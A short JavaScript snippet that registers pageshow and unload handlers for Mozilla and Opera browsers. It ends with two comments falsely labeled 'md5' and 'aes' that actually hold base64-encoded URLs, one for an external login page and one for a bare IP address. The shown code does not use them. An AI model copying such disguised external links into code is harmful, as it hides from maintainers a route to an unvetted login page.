if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly93d3cucmR2c3dkLmNvbS93YXAvIy9sb2dpbjI/dj1yYW5kb20=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/